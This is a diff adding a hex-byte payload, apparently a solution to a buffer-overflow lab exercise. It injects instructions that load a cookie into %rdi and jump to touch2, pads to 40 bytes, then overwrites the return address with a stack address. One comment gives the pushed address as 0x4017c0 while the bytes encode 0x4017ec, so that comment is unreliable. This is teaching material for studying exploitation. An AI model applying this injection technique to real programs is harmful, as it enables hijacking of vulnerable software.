@@ -1,0 +1,10 @@
+48 c7 c7 fa 97 b9 59   /* move $0x59b997fa %rdi, move cookie to %rdi, as the first argument of touch2 */
+68 ec 17 40 00         /* pushq $0x4017c0, push address of touch2 on stack */
+c3                     /* ret, program will execute touch2 with argument */
+00 00 00               /* 16 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  /* 40 bytes */
+78 dc 61 55 00 00 00 00  /* address of $rsp, that is the entry of injection code */
+
+
